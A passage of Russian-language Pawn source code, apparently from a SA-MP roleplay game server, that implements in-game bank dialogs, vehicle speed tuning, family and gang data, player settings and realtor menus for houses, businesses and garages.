		"7. Безналичный перевод\n"\
		"8. Оплатить дом\n"\
		"9. Оплатить бизнес\n"\
		"10. Оплатить штраф\n"\
		"11. Оплатить все штрафы",
		"Выбрать", "Выйти"
	);
}

stock ShowPlayerBankSelectDialog(playerid, bool: type)
{
	ShowPlayerDialog
	(
		playerid, DIALOG_BANK_SELECT_SUM, DIALOG_STYLE_INPUT,
		type ? ("{ffcc00}Снять деньги") : ("{ffcc00}Положить деньги"),
		"Введите сумму:",
		type ? ("Снять") : ("Положить"), "Назад"
	);

	player_select_other_sum[playerid] = type;
}
stock ShowPlayerBankCompanyDialog(playerid, bool: type)
{
	ShowPlayerDialog
	(
		playerid, DIALOG_BANK_SELECT_SUM_COMPANY, DIALOG_STYLE_INPUT,
		type ? ("{ffcc00}Снять деньги") : ("{ffcc00}Положить деньги"),
		"Введите сумму:",
		type ? ("Снять") : ("Положить"), "Назад"
	);

	player_select_other_sum[playerid] = type;
}

stock ShowPlayerDialoBankTransfer(playerid)
{
	ShowPlayerDialog
	(
		playerid, DIALOG_BANK_TRANSFER, DIALOG_STYLE_INPUT,
		"{FFCC00}Безналичный перевод",
		"{ffffff}Введите ник игрока и количество денег для перевода через запятую:\n(Пример: Ivan_Ivanov,100000)",
		"Перевести", "Отмена"
	);

	return 1;
}

stock IsValidBankAccount(playerid, accountid)
{
	if(0 <= accountid <= MAX_BANK_ACCOUNTS-1)
	{
		if(g_bank_accounts[playerid][accountid][B_ID] > 0)
		{
			return 1;
		}
	}
	return 0;
}

stock ShowPlayerBankAccountOperation(playerid)
{
	ShowPlayerDialog
	(
		playerid, DIALOG_BANK_ACCOUNT_OPERATION, DIALOG_STYLE_LIST,
		"{FFCC00}Список операций",
		"1. Информация о счете\n"\
		"2. История операций\n"\
		"3. Снять деньги\n"\
		"4. Положить деньги\n"\
		"5. Перевести на другой счет\n"\
		"6. Переименовать счет\n"\
		"7. Изменить PIN-код\n"\
		"8. Оплатить штраф\n"\
		"9. Оплатить все штрафы",
		"Выбрать", "Назад"
	);
	return 1;
}

stock ShowPlayerBankAccountCreate(playerid)
{
	ShowPlayerDialog
	(
		playerid, DIALOG_BANK_CREATE_ACCOUNT, DIALOG_STYLE_INPUT,
		"{FFCC00}Создание нового счета",
		"{FFFFFF}Введите название для нового счета.\n"\
		"Максимальная длина 64 символа:",
		"Ок", "Отмена"
	);
	return 1;
}

stock IsABadBankAccountName(dest[], pos=0)
{
	new is_bad_name = false;
	do
	{
		switch(dest[pos])
		{
			case
				'a'..'z', 'A'..'Z', 'а'..'я', 'А'..'Я', '0'..'9': continue;

			default:
				is_bad_name = true;

		}
	}
	while(dest[++pos]);

	return is_bad_name;
}

new const
	      KEY_VEHICLE_FORWARD  = 0b001000,
	      KEY_VEHICLE_BACKWARD = 0b100000;

forward EngineImprovement(playerid);
public EngineImprovement(playerid)
{
	new vehicleid = GetPlayerVehicleID(playerid);

	if(GetVehicleData(vehicleid, veh_owner_id) == INVALID_PLAYER_ID)
	{
		KillTimer(engine_improvement[playerid]);
		engine_improvement[playerid] = -1;
		return 1;
	}

	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2 && PI[playerid][P_TYPE_SPEED] != 0 && GetVehicleData(GetPlayerVehicleID(playerid), veh_engine) == true && engine_improvement[playerid] != -1)
	{
		new speed = SpeedVehicle(playerid)/2;

		if(speed > 250) return 1;

		new player_engine = PI[playerid][P_TYPE_SPEED];

		new keys,
			Float:vx,
			Float:vy,
			Float:vz;

		GetPlayerKeys(playerid, keys, _:vx, _:vx);

		if(speed <= g_tuning_engine[player_engine-1][E_MAX_SPEED] + g_vehicle_info[GetVehicleModel(vehicleid)-400][VI_MAX_SPEED])
		{
			if((keys & (KEY_VEHICLE_FORWARD | KEY_VEHICLE_BACKWARD | KEY_HANDBRAKE)) == KEY_VEHICLE_FORWARD)
			{
				GetVehicleVelocity(vehicleid, vx, vy, vz);

				vx *= 1.025;
				vy *= 1.025;

				if (vz > 0.04 || vz < -0.04)
					vz -= 0.020;

				SetVehicleVelocity(vehicleid, vx, vy, vz);
			}
		}
	}
	return 1;
}

GetPlayerVehicleSpeedZ(playerid)
{
	if(!IsPlayerInAnyVehicle(playerid)) return true;
	new Float:X, Float:Y, Float:Z;
	GetVehicleVelocity(GetPlayerVehicleID(playerid),X,Y,Z);
	return floatround( floatsqroot( X * X + Y * Y) * 180.0 );
}

_SetVehicleSpeed(vehicleid, speed_kmph)
{
	if(speed_kmph < 1) speed_kmph = 1;
	new Float: v[3], cur_speed_kmph;
	GetVehicleVelocity(vehicleid, v[0], v[1], v[2]);
	cur_speed_kmph = floatround(200.0 * floatsqroot( v[0]*v[0] + v[1]*v[1] + v[2]*v[2]), floatround_floor);
	if(cur_speed_kmph <= 0)
	{
		new Float: zAngle;
		GetVehicleZAngle(vehicleid, zAngle);
		new Float: newVelX = floatcos((zAngle -= 270.0), degrees ) * speed_kmph / 200.0;
		SetVehicleVelocity(vehicleid, newVelX, floattan(zAngle,degrees) * newVelX, 0.0);
		return;
	}
	new Float: vMultiplier = float(speed_kmph) / float(cur_speed_kmph);
	SetVehicleVelocity(vehicleid, v[0] * vMultiplier, v[1] * vMultiplier, v[2] * vMultiplier);
}

stock SetVehicleSpeed(vehicleid, Float:speed)
{
    new Float:cr[4];
    GetVehicleZAngle(vehicleid, cr[0]);
    GetVehicleVelocity(vehicleid, cr[1], cr[2], cr[3]);
    SetVehicleVelocity(vehicleid, floatsin(-cr[0],degrees)*(speed/99), floatcos(-cr[0],degrees)*(speed/99), cr[3]);
    return true;
}

stock LoadAreaActionts()
{
	for(new idx; idx < sizeof g_area_actionts; idx ++)
	{
		g_area_actions_total[idx] = CreateDynamicSphere(g_area_actionts[idx][g_area_actiont_pos_x], g_area_actionts[idx][g_area_actiont_pos_y], g_area_actionts[idx][g_area_actiont_pos_z], 1.0);

		if(g_area_actionts[idx][g_area_pickupid] != 0) CreatePickup(g_area_actionts[idx][g_area_pickupid], 23, g_area_actionts[idx][g_area_actiont_pos_x], g_area_actionts[idx][g_area_actiont_pos_y], g_area_actionts[idx][g_area_actiont_pos_z], -1);

		if(g_area_actionts[idx][a_actiont_text] != EOS)
		{
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s", g_area_actionts[idx][a_actiont_text]);
			CreateDynamic3DTextLabel(STRING_GLOBAL, COLOR_WHITE, g_area_actionts[idx][g_area_actiont_pos_x], g_area_actionts[idx][g_area_actiont_pos_y], g_area_actionts[idx][g_area_actiont_pos_z]+1.0, 10.0);
		}
	}
}

forward ExplosionDoor();
public ExplosionDoor()
{
	if(door_bank_status == 0)
	{
		CreateExplosion(523.48853, 657.67603, 3590.58057, 12, 5.0);
		bank_money_pickup = CreatePickup(1550, 1, 525.3143, 651.1093, 3591.5991, 0);
		MoveDynamicObject(door_bank,  523.48853, 657.67603, 3590.58057, 3.0, 89.00000, 0.00000, -20.46001);
		door_bank_status = 1;

		SendDMes(C_RED, "[D] ВНИМАНИЕ! ДВЕРЬ В ХРАНИЛИЩЕ БАНКА БЫЛА ВЗОРВАНА");
	}
	return 1;
}

stock SendBankAccountLog(playerid, accountid, reason[])
{
	STRING_GLOBAL[0] = EOS;
	mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO bank_accounts_logs (account,ip,time,reason) VALUES (%d,'%e',%d,'%e')", accountid, PI[playerid][pIP], gettime(), reason);
	mysql_query(dbHandle, STRING_GLOBAL);

	return 1;
}

stock ShowPlayerBankAccountLog(playerid, accountid)
{
	new fmt_str[128];
	new Cache: result;
	new rows;
	new time;
	new reason[64];

	format(fmt_str, sizeof fmt_str, "SELECT * FROM bank_accounts_logs WHERE account=%d ORDER BY id DESC LIMIT 20", accountid);
	result = mysql_query(dbHandle, fmt_str);

	rows = cache_num_rows();

	if(rows)
	{
		STRING_GLOBAL = "{FFFFFF}";
		new year, month, day;
		new hour, minute, second;

		for(new idx; idx < rows; idx ++)
		{
			time = cache_get_field_content_int(idx, "time");
			timestamp_to_date(time, year, month, day, hour, minute, second);

			cache_get_field_content(idx, "reason", reason, dbHandle, 64);

			format(fmt_str, sizeof fmt_str, "%d-%02d-%02d %02d:%02d:%02d\t\t%s\n", year, month, day, hour, minute, second, reason);
			strcat(STRING_GLOBAL, fmt_str);
		}
		ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFCC00}Последние 20 операций", STRING_GLOBAL, "Закрыть", "");
	}
	else ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFCC00}История", "{FFFFFF}История операций пуста", "Закрыть", "");

	cache_delete(result);
	return 1;
}

stock SetPlayerCheckpointToBase(playerid)
{
	new index = PI[playerid][pMember];

	if(index != 0)
	{
		static Float: coord_base[][3] =
		{
			{1947.0913,2157.0574,15.7060}, // ОПГ \"Тамбовская\"
			{-2232.9497,259.3292,24.5337},	// ОПГ \"Подольская\"
			{1954.3215,-1902.4561,31.8420},	// РУССКАЯ МАФИЯ
			{-2347.6846,2606.4204,41.8802}	// ИТАЛЬЯНСКАЯ МАФИЯ
		};

		SetPVarInt(playerid, "CheckpointGoToBase", 1);

		if(TEAM_GROOVE <= PI[playerid][pMember] <= TEAM_BALLAS)
		{
			new idx = index - TEAM_GROOVE;

			SetPlayerRaceCheckpoint(playerid, 1, coord_base[idx][0], coord_base[idx][1], coord_base[idx][2], 0.0, 0.0, 0.0, 3.0);
		}
		else if(TEAM_OPG1 <= PI[playerid][pMember] <= TEAM_RSM)
		{
			//new idx = TEAM_SMI - index;

			// ВЕРНУТЬСЯ

			switch(index)
			{
				case TEAM_OPG1: SetPlayerRaceCheckpoint(playerid, 1, coord_base[2][0], coord_base[2][1], coord_base[2][2], 0.0, 0.0, 0.0, 3.0);
				case TEAM_RSM: SetPlayerRaceCheckpoint(playerid, 1, coord_base[3][0], coord_base[3][1], coord_base[3][2], 0.0, 0.0, 0.0, 3.0);
			}

			//if(SetPlayerRaceCheckpoint(playerid, 1, coord_base[idx][0], coord_base[idx][1], coord_base[idx][2], 0.0, 0.0, 0.0, 3.0);
		}
	}

	return 1;
}

forward LoadFamily();
public LoadFamily()
{
	new time = GetTickCount();
	new rows, fields;
	cache_get_data(rows, fields);

	if(rows)
	{
		new sub[16];

		for(new idx; idx < rows; idx ++)
		{
			ClearFamilyData(idx);
			SetFamilyData(idx, F_ID, cache_get_row_int(idx, 0, dbHandle));
			cache_get_row(idx, 1, g_family_info[idx][F_NAME], dbHandle, 64);
			SetFamilyData(idx, F_OWNED, cache_get_row_int(idx, 2, dbHandle));
			cache_get_row(idx, 3, g_family_info[idx][F_OWNER], dbHandle, 64);
			cache_get_row(idx, 4, sub, dbHandle, 16);
			sscanf(sub, "p<,>ddd", g_family_info[idx][F_SUB][0], g_family_info[idx][F_SUB][1], g_family_info[idx][F_SUB][2]);

			SetFamilyData(idx, F_HOUSE, cache_get_row_int(idx, 6, dbHandle));
			SetFamilyData(idx, F_DRUGS, cache_get_row_int(idx, 7, dbHandle));
			SetFamilyData(idx, F_PATRON, cache_get_row_int(idx, 8, dbHandle));
			SetFamilyData(idx, F_MONEY, cache_get_row_int(idx, 9, dbHandle));
			SetFamilyData(idx, F_PROD, cache_get_row_int(idx, 10, dbHandle));
			SetFamilyData(idx, F_SPAWN, bool: cache_get_row_int(idx, 11, dbHandle));

			if(GetFamilyData(idx, F_HOUSE) != -1)
			{
				SetFamilyData(idx, F_STORE_LABEL, CreateDynamic3DTextLabel("Склад", 0xFFFF00FF, -179.9847,-11.4077,304.7484+1.0, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, HouseInfo[GetFamilyData(idx, F_HOUSE)][hVirtual], HouseInfo[GetFamilyData(idx, F_HOUSE)][hInt]));
				UpdateHouseFamilyLabel(idx);
			}

			TOTALFAMILY ++;
		}
	}
	printf("[Загружено семей]: <%d>. Потрачено: <%i ms>.", rows, GetTickCount() - time);
	return 1;
}

stock UpdateHouseFamilyLabel(idx)
{
	STRING_GLOBAL[0] = EOS;

	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"Шкаф\n\n"\
		"{FFFFFF}Наркотики: {6699FF}%d г\n"\
		"{FFFFFF}Патроны: {6699FF}%d шт\n"\
		"{FFFFFF}Деньги: {6699FF}%d руб\n"\
		"{FFFFFF}Продуктов: {6699FF}%d шт",
		GetFamilyData(idx-1, F_DRUGS),
		GetFamilyData(idx-1, F_PATRON),
		GetFamilyData(idx-1, F_MONEY),
		GetFamilyData(idx-1, F_PROD)
	);

	UpdateDynamic3DTextLabelText(GetFamilyData(idx-1, F_STORE_LABEL), 0xFFFF00FF, STRING_GLOBAL);
}

forward ShowFamilyInfo(playerid, familyid);
public ShowFamilyInfo(playerid, familyid)
{
	new rows = cache_num_rows();

	if(rows)
	{
		new fmt_info[90],
			time_create,
			year,
			month,
			day,
			hour,
			minute,
			second;

		time_create = cache_get_row_int(0, 5);
		timestamp_to_date(time_create, year, month, day, hour, minute, second);

		STRING_GLOBAL[0] = EOS;
		format(fmt_info, sizeof fmt_info, "{FFFFFF}Название семьи: {3399FF}%s", GetFamilyData(familyid-1, F_NAME));
		strcat(STRING_GLOBAL, fmt_info);

		format(fmt_info, sizeof fmt_info, "{FFFFFF}\nСоздатель семьи: {3399FF}%s", GetFamilyData(familyid-1, F_OWNER));
		strcat(STRING_GLOBAL, fmt_info);

		format(fmt_info, sizeof fmt_info, "{FFFFFF}\nДата создания: {3399FF}%d-%02d-%02d %02d:%02d:%02d", year, month, day, hour, minute, second);
		strcat(STRING_GLOBAL, fmt_info);

		format(fmt_info, sizeof fmt_info, "{FFFFFF}\nОнлайн семьи: {3399FF}%d", Iter_Count(FamilyMembers[familyid]));
		strcat(STRING_GLOBAL, fmt_info);

		ShowPlayerDialog
		(
			playerid, 0, DIALOG_STYLE_MSGBOX,
			"{ffcc00}Информация о семье",
			STRING_GLOBAL,
			"Закрыть", ""
		);
	}

	return 1;
}

stock ShowFamilyStructureDialog(playerid, familyid)
{
	STRING_GLOBAL = "\tУровень\tРанг\t\tТелефон\tИмя{FFFFFF}\n\n";

	new fmt_info[60];
	new rang;

	foreach(new i: FamilyMembers[familyid])
	{
		for(new idx; idx < 3; idx ++)
		{
			if(!strcmp(g_family_info[familyid-1][F_SUB][idx], PI[i][pID], false)) rang = 1;
		}
		if(GetFamilyData(familyid-1, F_OWNED) == PI[i][pID]) rang = 2;

		new family_rang[][] = {"Член семьи", "Заместитель", "Создатель"};

		format(fmt_info, sizeof fmt_info, "\t%d\t\t%s\t%d\t\t%s", PI[i][pLevel], family_rang[rang], PI[i][pPhoneNumber], GetName(i));
		strcat(STRING_GLOBAL, fmt_info);

		if(PI[i][pAFK] >= 3)
		{
			format(fmt_info, sizeof fmt_info, "-AFK [%s]", Converts(PI[i][pAFK]));
			strcat(STRING_GLOBAL, fmt_info);
		}

		strcat(STRING_GLOBAL, "\n");
	}

	ShowPlayerDialog
	(
		playerid, 0, DIALOG_STYLE_MSGBOX,
		"{ffcc00}Состав семьи онлайн",
		STRING_GLOBAL,
		"Закрыть", "Отмена"
	);

	return 1;
}

stock SendFamilyMessage(familyid, str[])
{
	foreach(new playerid: FamilyMembers[familyid])
	{
		SendClientMessage(playerid, g_info_color[ PI[playerid][P_FAMILY_COLOR] ][C_CODE], str);
	}
	return 1;
}

stock GetFamilyRang(playerid)
{
	new familyid = PI[playerid][P_FAMILY];
	new rang;

	if(familyid != 0)
	{
		rang = 1;

		for(new idx; idx < 3; idx ++)
		{
			if(!strcmp(g_family_info[familyid-1][F_SUB][idx], PI[playerid][pID], false)) rang = 1;
		}

		if(GetFamilyData(familyid-1, F_OWNED) == PI[playerid][pID]) rang = 3;
	}

	return rang;
}

stock SaveFamilyStore(familyid)
{
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE family SET drugs=%d, patron=%d, money=%d, prod=%d WHERE id=%d", GetFamilyData(familyid-1, F_DRUGS), GetFamilyData(familyid-1, F_PATRON), GetFamilyData(familyid-1, F_MONEY), GetFamilyData(familyid-1, F_PROD), familyid);
	mysql_query(dbHandle, STRING_GLOBAL);
}

forward ShowFamilyMembers(playerid);
public ShowFamilyMembers(playerid)
{
	new rows = cache_num_rows(),
		name[MAX_PLAYER_NAME],
		status[20],
		rang,
		id,
		datavhod[30];

	if(rows)
	{
		new familyid = PI[playerid][P_FAMILY];
		SendClientMessage(playerid, C_OSNOV, "Имя Фамилия - Ранг - Статус - Последний вход");
		for(new idx; idx < rows; idx ++)
		{
			STRING_GLOBAL[0] = EOS;
			cache_get_field_content(idx, "name", name, dbHandle, MAX_PLAYER_NAME);
			cache_get_field_content(idx, "datavhod", datavhod, dbHandle, 30);
			id = cache_get_field_content_int(idx, "id");

			if(GetPlayerID(name) == INVALID_PLAYER_ID) format(status, sizeof status, "{FF0000}оффлайн");
			else format(status, sizeof status, "{00FF00}онлайн(%d)", GetPlayerID(name));

			for(new i; i < 3; i ++)
			{
				if(g_family_info[familyid-1][F_SUB][i] == id) rang = 1;
			}
			if(GetFamilyData(familyid-1, F_OWNED) == id) rang = 2;

			new family_rang[][] = {"Член семьи", "Заместитель", "Создатель"};

			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s - %s - %s - %s", name, family_rang[rang], status, datavhod);
			SendClientMessage(playerid, -1, STRING_GLOBAL);

			rang = 0;
		}
		SendClientMessage(playerid, C_OSNOV, "Для более удобного чтения воспользуйтесь chatlog.txt");
	}
	return 1;
}

stock ShowPlayerMenuColors(playerid)
{
	PI[playerid][P_MENU_COLOR] = 1;

	SelectTextDraw(playerid, 0x009900FF);

	for(new i; i < 27; i ++) TextDrawShowForPlayer(playerid, color_menu_global_td[i]);

	for(new i; i < sizeof g_info_color; i ++) PlayerTextDrawColor(playerid, color_menu_player_td[playerid][i], g_info_color[i][C_CODE]);

	for(new i; i < 15; i ++) PlayerTextDrawShow(playerid, color_menu_player_td[playerid][i]);

	return 1;
}

stock HidePlayerMenuColors(playerid)
{
	PI[playerid][P_MENU_COLOR] = 0;

	for(new i; i < 27; i ++) TextDrawHideForPlayer(playerid, color_menu_global_td[i]);

	for(new i; i < 15; i ++) PlayerTextDrawHide(playerid, color_menu_player_td[playerid][i]);

	CancelSelectTextDraw(playerid);

	return 1;
}

stock LoadPlayerDialogSetting(playerid)
{
	new rows;
	new Cache: result;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM accounts_settings WHERE id=%d", PI[playerid][pID]);
	result = mysql_query(dbHandle, STRING_GLOBAL);

	rows = cache_num_rows();

	if(rows)
	{
		SetSettingPlayerData(playerid, PS_FAM_CHAT, cache_get_row_int(0, 2, dbHandle));
		SetSettingPlayerData(playerid, PS_FAM_CHAT_COLOR, cache_get_row_int(0, 3, dbHandle));
		SetSettingPlayerData(playerid, PS_ORG_CHAT, cache_get_row_int(0, 4, dbHandle));
		SetSettingPlayerData(playerid, PS_ORG_CHAT_COLOR, cache_get_row_int(0, 5, dbHandle));
		SetSettingPlayerData(playerid, PS_NAMES, cache_get_row_int(0, 6, dbHandle));
		SetSettingPlayerData(playerid, PS_ADM_LOGS, cache_get_row_int(0, 7, dbHandle));
		SetSettingPlayerData(playerid, PS_ADM_LOGS_COLOR, cache_get_row_int(0, 8, dbHandle));
		SetSettingPlayerData(playerid, PS_ID_PLAYERS, cache_get_row_int(0, 9, dbHandle));
		SetSettingPlayerData(playerid, PS_CASE, cache_get_row_int(0, 10, dbHandle));

		cache_delete(result);
	}
	else
	{
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO accounts_settings (uid) VALUES ('%d')", PI[playerid][pID]);
		mysql_query(dbHandle, STRING_GLOBAL);

		ClearSettingPlayer(playerid);

		cache_delete(result);
	}
	return 1;
}

stock ShowPlayerDialogSetting(playerid)
{
	STRING_GLOBAL[0] = EOS;

	new fmt_info[120];
	//new color_name[16];

	for(new idx; idx < sizeof settings_names; idx ++)
	{
		format(fmt_info, sizeof fmt_info, "%s", settings_names[idx][S_NAME]);
		strcat(STRING_GLOBAL, fmt_info);
	}


	/*for(new idx; idx < sizeof settings_names; idx ++)
	{
		if(settings_names[idx][S_COLOR] != 0)
		{
			format(color_name, sizeof color_name, "{%s}%s", g_info_color[ idx ][ C_CODE_RGB ], g_info_color[ idx ][ C_NAME ]);
			printf("%s", color_name);
		}

		format(fmt_info, sizeof fmt_info, "%s\t\t%s\n", settings_names[idx][S_NAME], color_name);
		strcat(STRING_GLOBAL, fmt_info);
		printf("fmt %s", fmt_info);
	}*/

	ShowPlayerDialog
	(
		playerid, DIALOG_PLAYER_SETTINGS, DIALOG_STYLE_LIST,
		"{ffcc00}Личные настройки",
		STRING_GLOBAL,
		"Изменить", "Отмена"
	);

	return 1;
}

stock ShowPlayerHousesDialog(playerid, count = 1)
{
	new fmt_info[144];
	new last_index;
	STRING_GLOBAL = "{FFFFFF}";
	new k;

	for(new idx = count; idx < TOTALHOUSE; idx ++)
	{
		if(count > TOTALHOUSE)
			break;

		if(last_index > 24)
			break;

		k = 0;

		for(new j; j < 4; j ++)
		{
			format(fmt_info, sizeof fmt_info, "%d-%s", HouseInfo[idx+j*25][hID], !strcmp(HouseInfo[idx+j*25][hOwner], "None", true) ? ("свободен") : ("занят\t"));
			strcat(STRING_GLOBAL, fmt_info);

			k ++;

			if(k == 4) strcat(STRING_GLOBAL, "\n");
			else strcat(STRING_GLOBAL, "\t\t");
		}

		last_index ++;
	}

	format(fmt_info, sizeof fmt_info, "{ffcc00}Свободные дома (%d-%d)", count, count+99);

	ShowPlayerDialog
	(
		playerid, DIALOG_REALTOR_MENU_HOUSE, DIALOG_STYLE_MSGBOX,
		fmt_info,
		STRING_GLOBAL,
		"Далее", "Закрыть"
	);
}

stock ShowPlayerBusinessDialog(playerid, count = 1)
{
	new fmt_info[144];
	new last_index;
	STRING_GLOBAL = "{FFFFFF}";
	new k;

	for(new idx = count; idx < TOTALBIZZ; idx ++)
	{
		if(count > TOTALBIZZ)
			break;

		if(last_index > 24)
			break;

		k = 0;

		for(new j; j < 4; j ++)
		{
			format(fmt_info, sizeof fmt_info, "%d-%s", BizzInfo[idx+j*25][bID], !strcmp(BizzInfo[idx+j*25][bOwner], "None", true) ? ("свободен") : ("занят\t"));
			strcat(STRING_GLOBAL, fmt_info);

			k ++;

			if(k == 4) strcat(STRING_GLOBAL, "\n");
			else strcat(STRING_GLOBAL, "\t\t");
		}

		last_index ++;
	}

	format(fmt_info, sizeof fmt_info, "{ffcc00}Свободные бизнесы (%d-%d)", count, count+99);

	ShowPlayerDialog
	(
		playerid, DIALOG_REALTOR_MENU_BIZ, DIALOG_STYLE_MSGBOX,
		fmt_info,
		STRING_GLOBAL,
		"Далее", "Закрыть"
	);
}

stock ShowPlayerInfoHouseDialog(playerid, houseid)
{
	new fmt_info[60];
	STRING_GLOBAL[0] = EOS;
	new house_name[3][16] = {"Низкий класс", "Средний класс", "Высокий класс"};

	format(fmt_info, sizeof fmt_info, "{FFFFFF}Тип / название:\t\t%s", house_name[HouseInfo[houseid][hDiscript]-1]);
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\nНомер дома:\t\t%d",  HouseInfo[houseid][hID]);
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\nСтоимость:\t\t%d рублей", HouseInfo[houseid][hPrice]);
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\nСтатус:\t\t\t%s", !strcmp(HouseInfo[houseid][hOwner], "None", true) ? ("{66CC00}Дом свободен") : ("{FF6600}Дом занят"));
	strcat(STRING_GLOBAL, fmt_info);

	strcat(STRING_GLOBAL, "{FFFFFF}\n\nВы можете посмотреть как выглядит этот дом снаружи и внутри.");
	strcat(STRING_GLOBAL, "\nДля этого нажмите кнопку \"Фото\". {ffcd00}Услуга стоит 100 рублей");

	ShowPlayerDialog
	(
		playerid, DIALOG_REALTOR_HOUSE_PHOTO, DIALOG_STYLE_MSGBOX,
		"{FF9933}Информация о выбранном доме",
		STRING_GLOBAL,
		"Фото", "Назад"
	);
}

stock ShowPlayerInfoBizDialog(playerid, businessid)
{
	new fmt_info[60];
	STRING_GLOBAL[0] = EOS;

	new house_name[10][24] = {"Маркет", "Заправка", "Закусочная", "Бар", "Клуб", "Аммуниция", "СТО", "Магазин одежды", "Казино", "Риэлторское агенство"};

	format(fmt_info, sizeof fmt_info, "{FFFFFF}Название:\t\t\t%s", BizzInfo[businessid][bName]);
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\n{FFFFFF}Тип:\t\t\t\t%s", house_name[BizzInfo[businessid][bType]-1]);
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\nНомер бизнеса:\t\t%d",  BizzInfo[businessid][bID]);
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\nСтоимость:\t\t\t%d рублей", BizzInfo[businessid][bPrice]);
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\nСтоимость за 1 продукт:\t%d рублей", BizzInfo[businessid][bTill]);
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\nСтоимость входа:\t\t%d рублей", BizzInfo[businessid][bEnter]);
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\nСтатус:\t\t\t\t%s", !strcmp(BizzInfo[businessid][bOwner], "None", true) ? ("{66CC00}Бизнес свободен") : ("{FF6600}Бизнес занят"));
	strcat(STRING_GLOBAL, fmt_info);

	strcat(STRING_GLOBAL, "{FFFFFF}\n\nВы можете посмотреть как выглядит этот бизнес снаружи");
	strcat(STRING_GLOBAL, "\nДля этого нажмите кнопку \"Фото\". {ffcd00}Услуга стоит 100 рублей");

 	ShowPlayerDialog
	(
		playerid, DIALOG_REALTOR_BIZ_PHOTO, DIALOG_STYLE_MSGBOX,
		"{FF9933}Информация о выбранном бизнесе",
		STRING_GLOBAL,
		"Фото", "Назад"
	);
}

stock ShowPlayerInfoGarageDialog(playerid, garageid)
{
	new fmt_info[60];
	STRING_GLOBAL[0] = EOS;

	format(fmt_info, sizeof fmt_info, "{FFFFFF}Название:\t\tГараж");
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\n{FFFFFF}Тип:\t\t\tГараж");
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\nНомер гаража:\t\t%d", g_garages[garageid][G_SQL_ID]);
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\nСтоимость:\t\t%d рублей", g_garages[garageid][G_PRICE]);
	strcat(STRING_GLOBAL, fmt_info);

	format(fmt_info, sizeof fmt_info, "\nСтатус:\t\t\t%s", !strcmp(g_garages[garageid][G_OWNER], "None", true) ? ("{66CC00}Гараж свободен") : ("{FF6600}Гараж занят"));
	strcat(STRING_GLOBAL, fmt_info);

	strcat(STRING_GLOBAL, "{FFFFFF}\n\nВы можете посмотреть как выглядит этот гараж снаружи");
	strcat(STRING_GLOBAL, "\nДля этого нажмите кнопку \"Фото\". {ffcd00}Услуга стоит 100 рублей");

 	ShowPlayerDialog
	(
		playerid, DIALOG_REALTOR_GARAGE_PHOTO, DIALOG_STYLE_MSGBOX,
		"{FF9933}Информация о выбранном гараже",
		STRING_GLOBAL,
		"Фото", "Назад"
	);
}


forward ShowPlayerMakePhoto(playerid, type, index);
public ShowPlayerMakePhoto(playerid, type, index)
{
	if(PI[playerid][P_REALTOR_TYPE] != type)
		return 1;

	new Float: angle;
	new Float: pos_x, Float: pos_y, Float: pos_z;
	new Float: exit_x, Float: exit_y, Float:cam_x, Float:cam_y;

	new realtor_view_name[][] = {"дома", "бизнеса", "гаража"};

	if(type != REALTOR_TYPE_BIZ)
	{
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Для просмотра %s внутри введите команду {00cccc}/inside", realtor_view_name[type-1]);
		SendClientMessage(playerid, -1, STRING_GLOBAL);
	}
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Для покупки %s введите команду {00cccc}/buy", realtor_view_name[type-1]);
	SendClientMessage(playerid, -1, STRING_GLOBAL);

	SendClientMessage(playerid, -1, "Используйте {00CC99}ПРОБЕЛ {FFFFFF}для выхода");

	switch(type)
	{
		case REALTOR_TYPE_HOUSE:
		{
			pos_x = HouseInfo[index][hEntrx];
			pos_y = HouseInfo[index][hEntry];
			pos_z = HouseInfo[index][hEntrz];

			exit_x = HouseInfo[index][hEntrx];
			exit_y = HouseInfo[index][hEntrx];

			angle = _GetAngleToPoint(exit_x, exit_y, pos_x, pos_y);
			SetPlayerPos(playerid, pos_x, pos_y, pos_z);

			cam_x = pos_x + 15.0 * -floatsin(angle, degrees);
			cam_y = pos_y + 15.0 * floatcos(angle, degrees);

			SetPlayerCameraPos(playerid, cam_x, cam_y, pos_z + 10.0);
			SetPlayerCameraLookAt(playerid, pos_x, pos_y, pos_z);
		}
		case REALTOR_TYPE_BIZ:
		{
			pos_x = BizzInfo[index][bEntrx];
			pos_y = BizzInfo[index][bEntry];
			pos_z = BizzInfo[index][bEntrz];

			exit_x = BizzInfo[index][B_ENTER_X];
			exit_y = BizzInfo[index][B_ENTER_Y];

			angle = _GetAngleToPoint(exit_x, exit_y, pos_x, pos_y);
			SetPlayerPos(playerid, pos_x, pos_y, pos_z);

